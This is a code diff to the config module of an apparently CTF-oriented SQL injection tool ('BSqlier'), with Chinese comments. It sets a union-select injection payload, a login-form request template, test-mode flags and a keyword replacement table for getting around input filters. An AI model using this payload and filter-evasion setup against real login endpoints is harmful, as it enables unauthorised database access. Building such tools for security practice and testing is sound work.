@@ -3,7 +3,7 @@
 import requests
 from bs4 import BeautifulSoup
 from lib.log import logger
-from urllib import quote
+from lib.dealpayload import DealPayload
 __author__ = "LoRexxar"
 
 
@@ -74,7 +74,7 @@ class BaseConfig:
             "build",
             "time"
         )
-        self.sqlimethod = SqliMethod[1]
+        self.sqlimethod = SqliMethod[0]
 
         # 若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4,解包函数在上面
 
@@ -97,13 +97,13 @@ class BaseConfig:
 
         而testmethod则是选择使用那种测试，互相兼容可以同时跑
         '''
-        self.wtest = False
+        self.wtest = True
 
         self.testmethod = {
-            "test": 0,
-            "database": 1,
-            "version": 1,
-            "user": 1
+            "test": 1,
+            "database": 0,
+            "version": 0,
+            "user": 0
         }
         '''
         正式注入模式的选择，test模式开启时，无论正式注入模式是否开启都无效，默认开启
@@ -156,14 +156,25 @@ class BaseConfig:
         payload===>替换为指定payload===>自定义替换表===>请求===>开始注入
 
         '''
-        self.payload = "padding' select 1,'BSqlier' limit 0,1#"
-
-        if self.sqlirequest == 'GET':
-            self.payload = quote(self.payload)
+        self.payload = "padding' union select 1,'BSqlier' limit 0,1#"
 
         '''
         配置请求,把请求中payload的位置设置为BSqlier（如果拼错了就会全部无效...）
         self.requesetformat = "user=BSqlier&passwd=ddog123&submit=Log+In"
         self.requesetformat = {"user": "BSqlier", "password": "a"}
         '''
-        self.requesetformat = "user=BSqlier&passwd=ddog123&submit=Log+In"
+        # self.requesetformat = "user=BSqlier&passwd=ddog123&submit=Log+In"
+        self.requesetformat = {"user": "BSqlier", "password": "a"}
+        '''
+        配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload
+        '''
+
+        self.filter = {
+            'select': 'SELECT',
+            'padding': 'ddog'
+        }
+
+        '''
+        初始化dealpayload类，传入self.sqlimethod，self.payload, self.requestformat, self.filter
+        '''
+        self.dealpayload = DealPayload(self.sqlirequest, self.payload, self.requesetformat, self.filter)
